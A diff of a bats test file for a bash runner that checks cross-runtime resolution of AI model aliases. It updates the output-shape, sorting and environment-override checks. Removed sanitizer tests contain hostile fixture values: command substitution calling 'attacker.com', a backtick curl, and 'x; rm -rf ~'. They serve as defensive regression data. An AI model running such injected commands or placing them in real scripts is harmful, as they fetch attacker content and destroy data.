@@ -1,30 +1,21 @@
 #!/usr/bin/env bats
 # =============================================================================
-# tests/bash/golden_resolution.bats
+# tests/bash/golden_resolution.bats — cycle-099 Sprint 2D bash golden runner
+# contract pins.
 #
-# cycle-099 Sprint 1D — Bash runner for the cross-runtime golden-resolution
-# test corpus (T1.11 per SDD §7.6.1).
+# Tests the bash golden test runner (`tests/bash/golden_resolution.sh`) which
+# independently re-implements the FR-3.9 6-stage resolver in bash for cross-
+# runtime parity verification (per SDD §1.5.1 + §7.6.2).
 #
-# Reads tests/fixtures/model-resolution/*.yaml, extracts the `sprint_1d_query`
-# alias from each, runs alias→provider:model_id resolution via the production
-# bash resolver (`model-resolver.sh::resolve_alias` / `resolve_provider_id`
-# backed by `generated-model-maps.sh`), and emits one canonical JSON line per
-# fixture to stdout.
+# G-series (G1-G15): per-runner contract pins (output shape, sorting, error
+# handling, env-override gates). Cross-runtime byte-equality with Python is
+# asserted in `tests/integration/sprint-2D-resolver-parity.bats`.
 #
-# This bats also verifies (in-process) that the emitted output matches the
-# committed golden file at `tests/fixtures/model-resolution/_golden.bash.jsonl`
-# — a regression guard that catches both:
-#   (a) drift in `generated-model-maps.sh` (a model removed from the registry)
-#   (b) regressions in the runner contract (output schema changes)
-#
-# CI parity gate (.github/workflows/cross-runtime-diff.yml) downloads each
-# runtime's emitted output and asserts byte-equality across bash/python/TS.
-# Mismatch fails the build per SDD §7.6.2.
-#
-# Sprint 1D scope: alias-lookup subset of FR-3.9 (stage 1/2 idempotent +
-# alias-hit). Stages 3-6 (tier_groups, legacy shape, framework default,
-# prefer_pro overlay) are deferred to Sprint 2 T2.6; runners emit a uniform
-# `deferred_to: "sprint-2-T2.6"` marker so cross-runtime parity holds.
+# Sprint 2D supersedes Sprint 1D's alias-lookup-only output shape. The
+# Sprint 1D shape `{fixture, input_alias, subset_supported, deferred_to?,
+# resolved_provider?, resolved_model_id?}` is replaced by the FR-3.9
+# `{fixture, skill, role, resolved_provider, resolved_model_id,
+# resolution_path}` OR `{fixture, skill, role, error}` shape.
 # =============================================================================
 
 setup() {
@@ -33,10 +24,10 @@ setup() {
     FIXTURES_DIR="$PROJECT_ROOT/tests/fixtures/model-resolution"
     GOLDEN_FILE="$FIXTURES_DIR/_golden.bash.jsonl"
     RUNNER="$PROJECT_ROOT/tests/bash/golden_resolution.sh"
-    RESOLVER="$PROJECT_ROOT/.claude/scripts/lib/model-resolver.sh"
+    RESOLVER_PY="$PROJECT_ROOT/.claude/scripts/lib/model-resolver.py"
 
     [[ -d "$FIXTURES_DIR" ]] || skip "fixtures dir not present"
-    [[ -f "$RESOLVER" ]] || skip "model-resolver.sh not present"
+    [[ -f "$RESOLVER_PY" ]] || skip "model-resolver.py not present"
     command -v jq >/dev/null 2>&1 || skip "jq not present"
     command -v yq >/dev/null 2>&1 || skip "yq not present"
 
@@ -57,83 +48,104 @@ teardown() {
     }
 }
 
-@test "G2 runner emits one JSON line per fixture (12 fixtures → 12 lines)" {
+@test "G2 runner emits one JSON line per (fixture × resolution) tuple" {
     "$RUNNER" > "$WORK_DIR/out.jsonl"
-    local lines
-    lines=$(wc -l < "$WORK_DIR/out.jsonl")
-    [[ "$lines" -eq 12 ]] || {
-        printf 'expected 12 output lines (one per fixture); got %d\n' "$lines" >&2
+    # Today every fixture has 1 resolution → expect 12 lines. If a fixture in
+    # the future declares N resolutions, the count grows. The pin asserts
+    # one-line-per-resolution invariant.
+    local expected_lines
+    expected_lines=$(find "$FIXTURES_DIR" -maxdepth 1 -name '*.yaml' -type f \
+        -exec yq -o json '.expected.resolutions // [] | length' {} \; \
+        | awk '{s+=$1} END{print s}')
+    local got_lines
+    got_lines=$(wc -l < "$WORK_DIR/out.jsonl")
+    [[ "$got_lines" -eq "$expected_lines" ]] || {
+        printf 'expected %d output lines (sum of expected.resolutions across fixtures); got %d\n' \
+            "$expected_lines" "$got_lines" >&2
         cat "$WORK_DIR/out.jsonl" >&2
         return 1
     }
 }
 
-@test "G3 each output line is valid canonical JSON (sorted keys)" {
+@test "G3 each output line is canonical JSON (sorted keys, no whitespace)" {
     "$RUNNER" > "$WORK_DIR/out.jsonl"
     while IFS= read -r line; do
+        [[ -z "$line" ]] && continue
         echo "$line" | jq -e . >/dev/null || {
             printf 'non-JSON line: %s\n' "$line" >&2
             return 1
         }
-        # Canonical = jq -S -c output equals input
         local canonical
         canonical=$(echo "$line" | jq -S -c .)
         [[ "$line" == "$canonical" ]] || {
-            printf 'line not canonical:\n  got: %s\n  exp: %s\n' "$line" "$canonical" >&2
+            printf 'non-canonical line:\n  got: %s\n  exp: %s\n' "$line" "$canonical" >&2
             return 1
         }
     done < "$WORK_DIR/out.jsonl"
 }
 
-@test "G4 every output has fixture + input_alias + subset_supported fields" {
+@test "G4 every line carries fixture + skill + role context" {
     "$RUNNER" > "$WORK_DIR/out.jsonl"
     while IFS= read -r line; do
-        echo "$line" | jq -e 'has("fixture") and has("input_alias") and has("subset_supported")' >/dev/null || {
-            printf 'missing required field: %s\n' "$line" >&2
+        [[ -z "$line" ]] && continue
+        echo "$line" | jq -e 'has("fixture") and has("skill") and has("role")' >/dev/null || {
+            printf 'missing fixture/skill/role: %s\n' "$line" >&2
             return 1
         }
     done < "$WORK_DIR/out.jsonl"
 }
 
-@test "G5 supported entries have resolved_provider + resolved_model_id" {
+@test "G5 success entries have resolved_provider + resolved_model_id + resolution_path; error entries have error block (mutually exclusive)" {
     "$RUNNER" > "$WORK_DIR/out.jsonl"
     while IFS= read -r line; do
-        local supported
-        supported=$(echo "$line" | jq -r .subset_supported)
-        if [[ "$supported" == "true" ]]; then
-            echo "$line" | jq -e 'has("resolved_provider") and has("resolved_model_id")' >/dev/null || {
-                printf 'supported entry missing provider/model_id: %s\n' "$line" >&2
+        [[ -z "$line" ]] && continue
+        local has_error
+        has_error=$(echo "$line" | jq -r 'has("error")')
+        if [[ "$has_error" == "true" ]]; then
+            echo "$line" | jq -e '
+                .error.code and (.error.stage_failed | type == "number") and .error.detail and
+                (has("resolved_provider") | not) and (has("resolution_path") | not)
+            ' >/dev/null || {
+                printf 'error entry malformed or has both error+success fields: %s\n' "$line" >&2
+                return 1
+            }
+        else
+            echo "$line" | jq -e '
+                has("resolved_provider") and has("resolved_model_id") and has("resolution_path") and
+                (.resolution_path | length) > 0
+            ' >/dev/null || {
+                printf 'success entry missing required fields: %s\n' "$line" >&2
                 return 1
             }
         fi
     done < "$WORK_DIR/out.jsonl"
 }
 
-@test "G6 deferred entries have deferred_to marker" {
+@test "G6 stage labels are pinned (stage1_pin_check..stage6_prefer_pro_overlay)" {
     "$RUNNER" > "$WORK_DIR/out.jsonl"
     while IFS= read -r line; do
-        local supported
-        supported=$(echo "$line" | jq -r .subset_supported)
-        if [[ "$supported" == "false" ]]; then
-            echo "$line" | jq -e 'has("deferred_to")' >/dev/null || {
-                printf 'deferred entry missing deferred_to: %s\n' "$line" >&2
-                return 1
-            }
-            local deferred_to
-            deferred_to=$(echo "$line" | jq -r .deferred_to)
-            [[ "$deferred_to" == "sprint-2-T2.6" ]] || {
-                printf 'unexpected deferred_to value: %s\n' "$deferred_to" >&2
-                return 1
-            }
-        fi
+        [[ -z "$line" ]] && continue
+        local has_path
+        has_path=$(echo "$line" | jq -r 'has("resolution_path")')
+        [[ "$has_path" == "false" ]] && continue
+        echo "$line" | jq -e '
+            .resolution_path
+            | all(.label == "stage1_pin_check"
+                  or .label == "stage2_skill_models"
+                  or .label == "stage3_tier_groups"
+                  or .label == "stage4_legacy_shape"
+                  or .label == "stage5_framework_default"
+                  or .label == "stage6_prefer_pro_overlay")
+        ' >/dev/null || {
+            printf 'unknown stage label in: %s\n' "$line" >&2
+            return 1
+        }
     done < "$WORK_DIR/out.jsonl"
 }
 
 @test "G7 output matches committed golden file (regression guard)" {
     "$RUNNER" > "$WORK_DIR/out.jsonl"
     if [[ ! -f "$GOLDEN_FILE" ]]; then
-        # BB iter-1 F8 fix: backticks inside a double-quoted skip message
-        # would execute as command substitution. Use single-quote nesting.
         skip 'golden file not yet committed (initial run); regenerate with: tests/bash/golden_resolution.sh > tests/fixtures/model-resolution/_golden.bash.jsonl'
     fi
     if ! diff -u "$GOLDEN_FILE" "$WORK_DIR/out.jsonl"; then
@@ -143,273 +155,228 @@ teardown() {
     fi
 }
 
-@test "G8 fixture-N order is stable (sorted by filename)" {
+@test "G8 fixture order is stable (sorted by fixture filename, then skill, then role)" {
     "$RUNNER" > "$WORK_DIR/out.jsonl"
-    # Extract `fixture` field from each line; assert sort order.
-    local fixtures
-    fixtures=$(jq -r .fixture < "$WORK_DIR/out.jsonl")
-    local sorted
-    sorted=$(printf '%s\n' "$fixtures" | sort)
-    [[ "$fixtures" == "$sorted" ]] || {
-        printf 'fixtures not in sorted order:\n--- got ---\n%s\n--- want ---\n%s\n' "$fixtures" "$sorted" >&2
+    local extracted sorted
+    extracted=$(jq -r '"\(.fixture)|\(.skill // "")|\(.role // "")"' < "$WORK_DIR/out.jsonl")
+    sorted=$(printf '%s\n' "$extracted" | LC_ALL=C sort)
+    [[ "$extracted" == "$sorted" ]] || {
+        printf 'output not in (fixture, skill, role) order:\n--- got ---\n%s\n--- want ---\n%s\n' \
+            "$extracted" "$sorted" >&2
         return 1
     }
 }
 
-@test "G9 known aliases (opus/tiny/cheap) resolve correctly" {
+@test "G9 fixture 02 (explicit pin) resolves to anthropic:claude-opus-4-7 via stage1" {
     "$RUNNER" > "$WORK_DIR/out.jsonl"
-    # 06-extra-only-model uses `opus` → claude-opus-4-7
-    local opus_line
-    opus_line=$(grep '"06-extra-only-model"' "$WORK_DIR/out.jsonl")
-    echo "$opus_line" | jq -e '.subset_supported == true and .resolved_model_id == "claude-opus-4-7" and .resolved_provider == "anthropic"' >/dev/null || {
-        printf 'opus resolution wrong: %s\n' "$opus_line" >&2
-        return 1
-    }
-    # 11-tiny-tier-anthropic uses `tiny` → claude-haiku-4-5-20251001
-    local tiny_line
-    tiny_line=$(grep '"11-tiny-tier-anthropic"' "$WORK_DIR/out.jsonl")
-    echo "$tiny_line" | jq -e '.subset_supported == true and .resolved_model_id == "claude-haiku-4-5-20251001"' >/dev/null || {
-        printf 'tiny resolution wrong: %s\n' "$tiny_line" >&2
-        return 1
-    }
-    # 12-degraded-mode-readonly uses `cheap` → claude-sonnet-4-6
-    local cheap_line
-    cheap_line=$(grep '"12-degraded-mode-readonly"' "$WORK_DIR/out.jsonl")
-    echo "$cheap_line" | jq -e '.subset_supported == true and .resolved_model_id == "claude-sonnet-4-6"' >/dev/null || {
-        printf 'cheap resolution wrong: %s\n' "$cheap_line" >&2
+    local line
+    line=$(grep '"02-explicit-pin-wins"' "$WORK_DIR/out.jsonl")
+    echo "$line" | jq -e '
+        .resolved_provider == "anthropic" and
+        .resolved_model_id == "claude-opus-4-7" and
+        .resolution_path[0].stage == 1 and
+        .resolution_path[0].label == "stage1_pin_check"
+    ' >/dev/null || {
+        printf 'fixture 02 stage1 expectation failed: %s\n' "$line" >&2
         return 1
     }
 }
 
-# cypherpunk CRIT-1 (PR #735 review): TS `in` operator walks Object.prototype.
-# Aliases like "toString" / "constructor" / "hasOwnProperty" must NOT trigger
-# the supported branch in any runner (bash/python/TS). All three runners must
-# emit the deferred marker. The cross-runtime-diff gate verifies byte-equal,
-# but each runner's correctness MUST also hold independently.
-@test "G11 prototype-poisoning aliases (toString/constructor/__proto__) defer cleanly" {
-    local synth_dir="$WORK_DIR/synth-fixtures"
+@test "G10 fixture 03 (missing tier) emits [TIER-NO-MAPPING] error" {
+    "$RUNNER" > "$WORK_DIR/out.jsonl"
+    local line
+    line=$(grep '"03-missing-tier-fail-closed"' "$WORK_DIR/out.jsonl")
+    echo "$line" | jq -e '
+        .error.code == "[TIER-NO-MAPPING]" and
+        .error.stage_failed == 3
+    ' >/dev/null || {
+        printf 'fixture 03 error expectation failed: %s\n' "$line" >&2
+        return 1
+    }
+}
+
+@test "G11 prototype-poisoning skill names emit per-runner uniform output (no JS-style prototype walk)" {
+    # cypherpunk CRIT-1 from PR #735 (Sprint 1D) targeted TS `key in obj`
+    # walking Object.prototype. In Sprint 2D the equivalent threat surface is
+    # in the runners' jq queries — `(.operator_config.skill_models // {})[$s]`
+    # where $s is "toString" or "constructor" must NOT match anything in an
+    # empty skill_models map. jq's `[]` operator is hasOwn-equivalent, so this
+    # is a regression guard against a future runtime swap.
+    local synth_dir="$WORK_DIR/synth-proto"
     mkdir -p "$synth_dir"
-    for proto_alias in "toString" "constructor" "hasOwnProperty" "valueOf" "__proto__" "isPrototypeOf"; do
-        cat > "$synth_dir/zz-${proto_alias}.yaml" <<EOF
-description: "cypherpunk CRIT-1 regression — Object.prototype attribute via fixture alias"
-sprint_1d_query:
-  alias: "$proto_alias"
+    for proto_skill in "toString" "constructor" "hasOwnProperty" "valueOf" "__proto__" "isPrototypeOf"; do
+        cat > "$synth_dir/zz-${proto_skill}.yaml" <<EOF
+description: "cypherpunk CRIT-1 regression — Object.prototype attribute via skill name"
+input:
+  schema_version: 2
+  framework_defaults:
+    providers:
+      anthropic:
+        models:
+          claude-opus-4-7: { capabilities: [chat] }
+    aliases:
+      opus: { provider: anthropic, model_id: claude-opus-4-7 }
+  operator_config: {}
+expected:
+  resolutions:
+    - skill: $proto_skill
+      role: primary
+      error:
+        code: "[NO-RESOLUTION]"
+        stage_failed: 5
+        detail: "no resolution"
 EOF
     done
-    LOA_GOLDEN_TEST_MODE=1 \
-    LOA_GOLDEN_FIXTURES_DIR="$synth_dir" \
-    "$RUNNER" > "$WORK_DIR/proto.jsonl"
+    LOA_GOLDEN_TEST_MODE=1 LOA_GOLDEN_FIXTURES_DIR="$synth_dir" \
+        "$RUNNER" > "$WORK_DIR/proto.jsonl"
     while IFS= read -r line; do
-        echo "$line" | jq -e '.subset_supported == false and .deferred_to == "sprint-2-T2.6"' >/dev/null || {
-            printf 'prototype-alias should NOT resolve as supported: %s\n' "$line" >&2
+        [[ -z "$line" ]] && continue
+        echo "$line" | jq -e '.error.code == "[NO-RESOLUTION]"' >/dev/null || {
+            printf 'prototype-skill should NOT resolve as success: %s\n' "$line" >&2
             return 1
         }
     done < "$WORK_DIR/proto.jsonl"
 }
 
-# cypherpunk CRIT-3 (PR #735 review): env-overrides MUST require explicit
-# test-mode opt-in. Mirrors the model-resolver.sh::LOA_MODEL_RESOLVER_TEST_MODE
-# pattern. Ungated overrides let an attacker who controls env redirect
-# resolution to attacker-controlled bash.
-@test "G12 LOA_GOLDEN_RESOLVER ungated → IGNORED (cypherpunk CRIT-3)" {
-    local fake="$WORK_DIR/fake-resolver.sh"
-    cat > "$fake" <<'EOF'
-#!/usr/bin/env bash
-declare -A MODEL_PROVIDERS=( ["evil"]="attacker" )
-declare -A MODEL_IDS=( ["evil"]="evil" )
+@test "G12 LOA_GOLDEN_FIXTURES_DIR ungated → IGNORED (cypherpunk CRIT-3 parity)" {
+    local synth_dir="$WORK_DIR/synth-fake"
+    mkdir -p "$synth_dir"
+    cat > "$synth_dir/zz-fake.yaml" <<'EOF'
+description: "fake fixture — should NOT be loaded without test mode"
+input:
+  schema_version: 2
+  framework_defaults: {}
+  operator_config: {}
+expected:
+  resolutions:
+    - skill: should_not_appear
+      role: primary
+      resolved_provider: evil
+      resolved_model_id: evil
 EOF
-    # WITHOUT LOA_GOLDEN_TEST_MODE=1, the override must be IGNORED.
-    # Note: bats sets BATS_TEST_DIRNAME, which is the secondary test gate;
-    # to verify ungated rejection we explicitly clear both AND clear bats
-    # context via env -i with minimal allowlist.
+    # WITHOUT LOA_GOLDEN_TEST_MODE=1 (and NOT under bats since we use env -i)
     run env -i HOME="$HOME" PATH="$PATH" \
-        LOA_GOLDEN_RESOLVER="$fake" \
-        LOA_GOLDEN_PROJECT_ROOT="$PROJECT_ROOT" \
-        LOA_GOLDEN_FIXTURES_DIR="$PROJECT_ROOT/tests/fixtures/model-resolution" \
+        LOA_GOLDEN_FIXTURES_DIR="$synth_dir" \
         bash "$RUNNER"
     [[ "$status" -eq 0 ]] || {
-        printf 'runner should still succeed (override ignored, default loaded); status=%d output=%s\n' "$status" "$output" >&2
+        printf 'runner should still succeed (override ignored, default loaded); status=%d output=%s\n' \
+            "$status" "$output" >&2
         return 1
     }
-    # The fake resolver only had one entry "evil"; if the override was
-    # honored, opus would defer (not in fake MODEL_IDS). If ignored, opus
-    # resolves via the real generated-model-maps.sh.
-    [[ "$output" == *"claude-opus-4-7"* ]] || {
-        printf 'override should be ignored without test mode; output=%s\n' "$output" >&2
+    # Output should contain the REAL fixtures (e.g., 01-happy-path) — not "should_not_appear"
+    [[ "$output" != *"should_not_appear"* ]] || {
+        printf 'override should be ignored without test mode; got: %s\n' "$output" >&2
         return 1
     }
 }
 
-@test "G12b LOA_GOLDEN_RESOLVER + LOA_GOLDEN_TEST_MODE=1 → HONORED (test escape)" {
-    local fake="$WORK_DIR/fake-resolver-honored.sh"
-    cat > "$fake" <<'EOF'
-declare -A MODEL_PROVIDERS=( ["only-fake-alias"]="fake" )
-declare -A MODEL_IDS=( ["only-fake-alias"]="only-fake-alias" )
-resolve_alias() { echo "${MODEL_IDS[$1]:-}"; }
-resolve_provider_id() { echo "${MODEL_PROVIDERS[${MODEL_IDS[$1]:-}]:-}:${MODEL_IDS[$1]:-}"; }
+@test "G12b LOA_GOLDEN_FIXTURES_DIR + LOA_GOLDEN_TEST_MODE=1 → HONORED" {
+    local synth_dir="$WORK_DIR/synth-honored"
+    mkdir -p "$synth_dir"
+    cat > "$synth_dir/zz-honored.yaml" <<'EOF'
+description: "honored fixture — loaded under TEST_MODE"
+input:
+  schema_version: 2
+  framework_defaults:
+    providers:
+      anthropic:
+        models:
+          claude-opus-4-7: { capabilities: [chat] }
+    aliases:
+      opus: { provider: anthropic, model_id: claude-opus-4-7 }
+  operator_config:
+    skill_models:
+      synth_skill:
+        primary: opus
+expected:
+  resolutions:
+    - skill: synth_skill
+      role: primary
+      resolved_provider: anthropic
+      resolved_model_id: claude-opus-4-7
 EOF
     LOA_GOLDEN_TEST_MODE=1 \
-    LOA_GOLDEN_RESOLVER="$fake" \
-    "$RUNNER" > "$WORK_DIR/honored.jsonl"
-    # With override honored, opus is no longer in MODEL_IDS → must defer
-    grep '"06-extra-only-model"' "$WORK_DIR/honored.jsonl" | grep -q '"deferred_to"' || {
-        printf 'override should be honored under TEST_MODE; opus should defer\n' >&2
-        cat "$WORK_DIR/honored.jsonl" >&2
+    LOA_GOLDEN_FIXTURES_DIR="$synth_dir" \
+        "$RUNNER" > "$WORK_DIR/honored.jsonl"
+    grep -q '"synth_skill"' "$WORK_DIR/honored.jsonl" || {
+        printf 'honored fixture skill should appear under TEST_MODE; got: %s\n' \
+            "$(cat "$WORK_DIR/honored.jsonl")" >&2
         return 1
     }
 }
 
-# cypherpunk HIGH-3 (PR #735 review): pre-source sanitize generated-model-maps.sh.
-# Bash sources the file and would execute embedded $(...) at source time.
-# The sanitizer rejects this BEFORE source.
-@test "G13 generated-maps with command substitution is REJECTED pre-source (HIGH-3)" {
-    local hostile="$WORK_DIR/hostile-maps.sh"
-    cat > "$hostile" <<'EOF'
-declare -A MODEL_PROVIDERS=( ["evil"]="$(curl attacker.com/x)" )
-declare -A MODEL_IDS=( ["evil"]="evil" )
-EOF
-    run env LOA_GOLDEN_TEST_MODE=1 \
-        LOA_GOLDEN_GENERATED_MAPS="$hostile" \
-        bash "$RUNNER"
-    # Expected: pre-source sanitizer detects $(...) and exits non-zero.
-    [[ "$status" -ne 0 ]] || {
-        printf 'pre-source sanitizer should reject hostile maps; status=%d output=%s\n' "$status" "$output" >&2
-        return 1
-    }
-    [[ "$output" == *"sanitiz"* || "$output" == *"reject"* || "$output" == *"unsafe"* ]] || {
-        printf 'rejection message missing; output=%s\n' "$output" >&2
-        return 1
-    }
-}
-
-@test "G13b generated-maps with backtick is REJECTED" {
-    local hostile="$WORK_DIR/hostile-tick.sh"
-    printf 'declare -A MODEL_PROVIDERS=( ["evil"]="`curl attacker`" )\ndeclare -A MODEL_IDS=( ["evil"]="evil" )\n' > "$hostile"
-    run env LOA_GOLDEN_TEST_MODE=1 \
-        LOA_GOLDEN_GENERATED_MAPS="$hostile" \
-        bash "$RUNNER"
-    [[ "$status" -ne 0 ]]
-}
-
-@test "G13c generated-maps with semicolon in value is REJECTED" {
-    local hostile="$WORK_DIR/hostile-semi.sh"
-    cat > "$hostile" <<'EOF'
-declare -A MODEL_PROVIDERS=( ["evil"]="x; rm -rf ~" )
-declare -A MODEL_IDS=( ["evil"]="evil" )
-EOF
-    run env LOA_GOLDEN_TEST_MODE=1 \
-        LOA_GOLDEN_GENERATED_MAPS="$hostile" \
-        bash "$RUNNER"
-    [[ "$status" -ne 0 ]]
-}
-
-@test "G13d clean generated-maps PASSES sanitizer (regression guard)" {
-    # The real generated-model-maps.sh must pass the sanitizer; otherwise
-    # cycle-099 production state breaks. BB iter-2 F5 fix: use `run` for
-    # explicit $status assertion (not the always-zero $? of `[[ ]]`).
-    run "$RUNNER"
-    [[ "$status" -eq 0 ]] || {
-        printf 'production generated-model-maps.sh failed sanitizer; status=%d\n' "$status" >&2
-        printf 'output: %s\n' "$output" >&2
-        return 1
-    }
-}
-
-# cypherpunk CRIT-2 (PR #735 review): bash runner must reject non-string
-# YAML values for sprint_1d_query.alias (booleans, numbers, null).
-# BB iter-1 F7: sanitizer must also reject command substitution OUTSIDE
-# any `declare -A` block (bash executes it at sourcing time, before any
-# array opens).
-@test "G15 generated-maps with outside-array command-sub is REJECTED (BB F7)" {
-    local hostile="$WORK_DIR/hostile-outside.sh"
-    cat > "$hostile" <<'EOF'
-#!/usr/bin/env bash
-: $(curl attacker.com/x)
-declare -A MODEL_PROVIDERS=(
-    ["foo"]="bar"
-)
-declare -A MODEL_IDS=(
-    ["foo"]="foo"
-)
-EOF
-    run env LOA_GOLDEN_TEST_MODE=1 \
-        LOA_GOLDEN_GENERATED_MAPS="$hostile" \
-        bash "$RUNNER"
-    [[ "$status" -ne 0 ]] || {
-        printf 'outside-array command-sub should be rejected; status=%d output=%s\n' "$status" "$output" >&2
-        return 1
-    }
-    [[ "$output" == *"outside"* || "$output" == *"reject"* ]]
-}
-
-@test "G15b generated-maps with 'unset -f' outside-array is REJECTED (BB F7)" {
-    local hostile="$WORK_DIR/hostile-unset.sh"
-    cat > "$hostile" <<'EOF'
-unset -f resolve_alias
-declare -A MODEL_PROVIDERS=(
-    ["foo"]="bar"
-)
-declare -A MODEL_IDS=(
-    ["foo"]="foo"
-)
-EOF
-    run env LOA_GOLDEN_TEST_MODE=1 \
-        LOA_GOLDEN_GENERATED_MAPS="$hostile" \
-        bash "$RUNNER"
-    [[ "$status" -ne 0 ]]
-}
-
-# BB iter-1 F3: malformed YAML must produce a uniform error marker
-# across all 3 runners (no exception text varying by parser version).
-@test "G16 malformed YAML fixture emits uniform error marker (BB F3)" {
-    local synth_dir="$WORK_DIR/synth-malformed"
+@test "G13 malformed YAML emits uniform [YAML-PARSE-FAILED] error" {
+    local synth_dir="$WORK_DIR/synth-broken"
     mkdir -p "$synth_dir"
     cat > "$synth_dir/zz-broken.yaml" <<'EOF'
-description: "malformed YAML — unbalanced bracket"
-sprint_1d_query:
-  alias: [unbalanced
+input:
+  schema_version: [unbalanced
 EOF
-    LOA_GOLDEN_TEST_MODE=1 \
-    LOA_GOLDEN_FIXTURES_DIR="$synth_dir" \
-    "$RUNNER" > "$WORK_DIR/malformed.jsonl" 2>&1 || true
-    # Bash: yq returns empty/error; the sanitizer-based error path emits
-    # missing-sprint_1d_query-alias OR invalid-alias-type:!!seq.
-    # The harmonized contract: SOMETHING uniform across runtimes.
-    grep -qE '"error"|"deferred_to"' "$WORK_DIR/malformed.jsonl" || {
-        printf 'malformed YAML must emit error/deferred marker; got: %s\n' "$(cat "$WORK_DIR/malformed.jsonl")" >&2
+    LOA_GOLDEN_TEST_MODE=1 LOA_GOLDEN_FIXTURES_DIR="$synth_dir" \
+        "$RUNNER" > "$WORK_DIR/broken.jsonl" 2>&1 || true
+    grep -q '\[YAML-PARSE-FAILED\]' "$WORK_DIR/broken.jsonl" || {
+        printf 'malformed YAML should emit [YAML-PARSE-FAILED]; got: %s\n' \
+            "$(cat "$WORK_DIR/broken.jsonl")" >&2
         return 1
     }
 }
 
-@test "G14 fixture with boolean alias is REJECTED" {
-    local synth_dir="$WORK_DIR/synth-bool"
+@test "G14 fixture lacking expected.resolutions[] emits [NO-EXPECTED-RESOLUTIONS] error" {
+    local synth_dir="$WORK_DIR/synth-noexp"
     mkdir -p "$synth_dir"
-    cat > "$synth_dir/zz-bool.yaml" <<'EOF'
-description: "alias is YAML boolean — not a string"
-sprint_1d_query:
-  alias: false
+    cat > "$synth_dir/zz-noexp.yaml" <<'EOF'
+description: "no expected resolutions block"
+input:
+  schema_version: 2
+  framework_defaults: {}
+  operator_config: {}
 EOF
-    LOA_GOLDEN_TEST_MODE=1 \
-    LOA_GOLDEN_FIXTURES_DIR="$synth_dir" \
-    "$RUNNER" > "$WORK_DIR/bool.jsonl"
-    grep -q '"error"' "$WORK_DIR/bool.jsonl" || {
-        printf 'boolean alias should emit error marker, not resolve as "false"; got: %s\n' "$(cat "$WORK_DIR/bool.jsonl")" >&2
-        return 1
-    }
-    ! grep -q '"resolved_provider"' "$WORK_DIR/bool.jsonl" || {
-        printf 'boolean alias must NOT have resolved_provider; got: %s\n' "$(cat "$WORK_DIR/bool.jsonl")" >&2
+    LOA_GOLDEN_TEST_MODE=1 LOA_GOLDEN_FIXTURES_DIR="$synth_dir" \
+        "$RUNNER" > "$WORK_DIR/noexp.jsonl"
+    grep -q '\[NO-EXPECTED-RESOLUTIONS\]' "$WORK_DIR/noexp.jsonl" || {
+        printf 'fixture without expected.resolutions[] should emit [NO-EXPECTED-RESOLUTIONS]; got: %s\n' \
+            "$(cat "$WORK_DIR/noexp.jsonl")" >&2
         return 1
     }
 }
 
-@test "G10 deferred fixtures (max / max-nonexistent-tier / nonexistent-base-model / colliding-id) emit deferred markers" {
-    "$RUNNER" > "$WORK_DIR/out.jsonl"
-    for fix in "01-happy-path-tier-tag" "03-missing-tier-fail-closed" "05-override-conflict" "10-extra-vs-override-collision"; do
-        local line
-        line=$(grep "\"$fix\"" "$WORK_DIR/out.jsonl")
-        echo "$line" | jq -e '.subset_supported == false and .deferred_to == "sprint-2-T2.6"' >/dev/null || {
-            printf '%s should be deferred: %s\n' "$fix" "$line" >&2
-            return 1
-        }
-    done
+@test "G15 IMP-007 alias-collides-with-tier surfaces alias_collides_with_tier=true on stage 3 details" {
+    local synth_dir="$WORK_DIR/synth-imp007"
+    mkdir -p "$synth_dir"
+    cat > "$synth_dir/zz-imp007.yaml" <<'EOF'
+description: "IMP-007 — tier-tag wins; collision flag on details"
+input:
+  schema_version: 2
+  framework_defaults:
+    providers:
+      anthropic:
+        models:
+          claude-opus-4-7: { capabilities: [chat] }
+    aliases:
+      opus: { provider: anthropic, model_id: claude-opus-4-7 }
+    tier_groups:
+      mappings:
+        max: { anthropic: opus }
+  operator_config:
+    skill_models:
+      flatline_protocol:
+        primary: max
+    model_aliases_extra:
+      max:
+        provider: anthropic
+        model_id: claude-opus-4-7
+        capabilities: [chat]
+expected:
+  resolutions:
+    - skill: flatline_protocol
+      role: primary
+      resolved_provider: anthropic
+      resolved_model_id: claude-opus-4-7
+EOF
+    LOA_GOLDEN_TEST_MODE=1 LOA_GOLDEN_FIXTURES_DIR="$synth_dir" \
+        "$RUNNER" > "$WORK_DIR/imp007.jsonl"
+    grep -q '"alias_collides_with_tier":true' "$WORK_DIR/imp007.jsonl" || {
+        printf 'IMP-007 collision flag missing; got: %s\n' "$(cat "$WORK_DIR/imp007.jsonl")" >&2
+        return 1
+    }
 }
